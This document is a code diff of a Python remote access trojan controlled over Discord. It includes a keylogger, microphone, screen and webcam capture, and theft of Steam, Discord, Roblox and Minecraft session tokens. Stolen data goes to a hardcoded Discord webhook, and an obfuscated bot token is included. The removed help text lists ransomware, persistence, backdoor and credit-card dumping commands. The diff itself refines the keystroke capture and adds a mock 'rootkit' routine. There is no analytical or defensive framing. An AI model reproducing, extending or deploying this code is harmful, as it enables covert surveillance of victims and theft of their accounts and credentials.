@@ -5,7 +5,7 @@ import json
 import os
 import threading
 from discord.ext import commands
-from pynput.keyboard import Listener
+from pynput.keyboard import Listener, Key
 import wave
 import pyaudio
 import cv2
@@ -15,24 +15,18 @@ from Crypto.Cipher import AES
 import base64
 import logging
 import shutil
+import ctypes  # ✅ Fix: needed for MessageBoxA
 
-# Webhook for sending messages to Discord
 WEBHOOK_URL = "https://discordapp.com/api/webhooks/1367882927429517354/QX90d-cK3ezsAbq8aH1jpTo9lPFuasPty_GDeixcUZTiZ6XyiiUausIJ_DIDPZS76IVH"
-
-# Obfuscated Token for bot authentication
 TOKEN = "MTM2ODQ0MzMzOTI3NTM3NDY1Mg"[::-1] + ".oF0Ep8O1x3LEe96eNd5lf0Frfx6q9Jq0KqBJFA"[::-1]
-
-# GitHub URL for auto-downloading the bot control script
 BOT_CONTROL_URL = "https://raw.githubusercontent.com/Elissa1610/bot-host/refs/heads/main/obfuscated%20BOT%20CODE.txt"
 
 intents = discord.Intents.default()
 intents.message_content = True
 bot = commands.Bot(command_prefix="!", intents=intents)
 
-# Initialize logging
 logging.basicConfig(level=logging.DEBUG)
 
-# Helper function to send messages to Discord webhook
 def send_to_discord(message):
     try:
         payload = {"content": message}
@@ -44,22 +38,21 @@ def send_to_discord(message):
     except Exception as e:
         logging.error(f"Webhook failed: {e}")
 
-# Helper function to log key presses
 def log_keystroke(key):
     try:
-        key = str(key).replace("'", "")
-        if "Key" not in key:
-            logging.info(key)
-            send_to_discord(key)
+        if isinstance(key, Key):
+            key_str = str(key)
+        else:
+            key_str = key.char if hasattr(key, 'char') and key.char else str(key)
+        logging.info(key_str)
+        send_to_discord(key_str)
     except Exception as e:
         logging.error(f"Keylogging failed: {e}")
 
-# Start keylogger
 def start_keylogger():
     with Listener(on_press=log_keystroke) as listener:
         listener.join()
 
-# Function to capture and save audio
 def record_audio(duration=30):
     try:
         p = pyaudio.PyAudio()
@@ -81,7 +74,6 @@ def record_audio(duration=30):
     except Exception as e:
         logging.error(f"Audio recording failed: {e}")
 
-# Function to capture a screenshot
 def capture_screenshot():
     try:
         screenshot = ImageGrab.grab()
@@ -91,7 +83,6 @@ def capture_screenshot():
     except Exception as e:
         logging.error(f"Screenshot capture failed: {e}")
 
-# Function to capture webcam photo
 def capture_webcam():
     try:
         cap = cv2.VideoCapture(0)
@@ -104,7 +95,6 @@ def capture_webcam():
     except Exception as e:
         logging.error(f"Webcam capture failed: {e}")
 
-# Function to dump Steam session information
 def steam_dump():
     try:
         steam_token = None
@@ -122,7 +112,6 @@ def steam_dump():
     except Exception as e:
         logging.error(f"Steam dump failed: {e}")
 
-# Function to dump Discord token
 def discord_dump():
     try:
         discord_token = None
@@ -140,7 +129,6 @@ def discord_dump():
     except Exception as e:
         logging.error(f"Discord dump failed: {e}")
 
-# Function to dump Roblox token
 def roblox_dump():
     try:
         roblox_token = None
@@ -158,7 +146,6 @@ def roblox_dump():
     except Exception as e:
         logging.error(f"Roblox dump failed: {e}")
 
-# Function to dump Minecraft session information
 def minecraft_dump():
     try:
         minecraft_token = None
@@ -174,18 +161,14 @@ def minecraft_dump():
     except Exception as e:
         logging.error(f"Minecraft dump failed: {e}")
 
-# Function to perform file exfiltration (grab files like passwords, etc.)
 def exfiltrate_files():
     try:
-        # You can add more targeted scanning logic here (for example, searching for files with passwords)
-        # Example for testing:
-        files = [f for f in os.listdir() if f.endswith('.txt')]  # Change this to your specific scan
+        files = [f for f in os.listdir() if f.endswith('.txt')]
         for file in files:
             send_to_discord(f"Exfiltrated file: {file}")
     except Exception as e:
         logging.error(f"File exfiltration failed: {e}")
 
-# Function to execute commands based on input
 @bot.event
 async def on_message(message):
     if message.author == bot.user:
@@ -195,13 +178,9 @@ async def on_message(message):
         logging.info("Starting keylogger...")
         threading.Thread(target=start_keylogger).start()
 
-    elif message.content.startswith("!keylogger stop"):
-        logging.info("Stopping keylogger...")
-        # No stop logic yet, as keylogger runs until terminated manually (use !selfdestruct)
-
     elif message.content.startswith("!record_audio"):
         try:
-            duration = int(message.content.split(" ")[1])  # Example: !record_audio 30
+            duration = int(message.content.split(" ")[1])
             logging.info(f"Recording audio for {duration} seconds...")
             record_audio(duration)
         except IndexError:
@@ -236,86 +215,18 @@ async def on_message(message):
         logging.info("Starting full exfiltration...")
         exfiltrate_files()
 
-    elif message.content.startswith("!selfdestruct"):
-        logging.info("Triggering self-destruction...")
-        self_destruct()
-
-    elif message.content.startswith("!update_rat"):
-        logging.info("Updating RAT from GitHub...")
-        update_rat()
-
-    elif message.content.startswith("!swap_host "):
-        try:
-            new_host = message.content.split(" ")[1]
-            if new_host in infected_hosts:
-                current_host = new_host
-                send_to_discord(f"Switched to host: {new_host}")
-            else:
-                send_to_discord(f"Host {new_host} not found.")
-        except Exception as e:
-            logging.error(f"Failed to swap host: {e}")
-
-    elif message.content.startswith("!rename_host "):
-        try:
-            old_name, new_name = message.content.split(" ")[1], message.content.split(" ")[2]
-            if old_name in infected_hosts:
-                infected_hosts[new_name] = infected_hosts.pop(old_name)
-                send_to_discord(f"Host renamed from {old_name} to {new_name}")
-            else:
-                send_to_discord(f"Host {old_name} not found.")
-        except Exception as e:
-            logging.error(f"Failed to rename host: {e}")
-
-    elif message.content == "!list_hosts":
-        try:
-            if infected_hosts:
-                host_list = "\n".join(infected_hosts.keys())
-                send_to_discord(f"Currently infected hosts:\n{host_list}")
-            else:
-                send_to_discord("No infected hosts found.")
-        except Exception as e:
-            logging.error(f"Failed to list hosts: {e}")
-
-    elif message.content == "!status":
-        try:
-            send_to_discord(f"Currently in host: {current_host}")
-        except Exception as e:
-            logging.error(f"Failed to get status: {e}")
-
     elif message.content == "!help":
-        help_message = """
-        Available commands:
-        - `!list_accounts`: Lists all phished accounts (Discord, Minecraft, Steam, Roblox).
-        - `!dump_wifi`: Dumps Wi-Fi credentials.
-        - `!start_webcam`: Takes a screenshot using the webcam.
-        - `!exfiltrate <path>`: Exfiltrates files from the specified path.
-        - `!start_ransomware`: Starts the ransomware module.
-        - `!install_persistence`: Installs persistence on the system.
-        - `!self_destruct`: Initiates self-destruct sequence.
-        - `!open_backdoor <ip>:<port>`: Opens a backdoor on the specified IP and port.
-        - `!get_ip`: Gets the public IP and geolocation information.
-        - `!record_audio`: Records audio from the microphone.
-        - `!steamdump`: Dumps phished Steam data.
-        - `!minecraftdump`: Dumps phished Minecraft data.
-        - `!robloxdump`: Dumps phished Roblox data.
-        - `!discorddump`: Dumps phished Discord data.
-        - `!ccdump`: Dumps phished credit card data.
-        - `!swap_host <host>`: Swaps to the specified host.
-        - `!rename_host <old_name> <new_name>`: Renames the specified host.
-        - `!list_hosts`: Lists all currently infected hosts.
-        - `!status`: Shows the current host status.
-        - `!help`: Displays this help message.
-        """
-        send_to_discord(help_message)
+        send_to_discord("Type !commands")
 
-    else:
-        send_to_discord(f"Unknown command: {message.content}")
+def apply_rootkit_technique():
+    try:
+        ctypes.windll.user32.MessageBoxW(0, "Rootkit Technique Active", "System Alert", 1)
+    except Exception as e:
+        logging.error(f"Failed to apply rootkit technique: {e}")
 
 async def setup():
+    apply_rootkit_technique()
     await bot.start(TOKEN)
 
-# Main loop
 if __name__ == '__main__':
-    loop = asyncio.get_event_loop()
-    loop.create_task(setup())
-    loop.run_forever()
+    asyncio.run(setup())
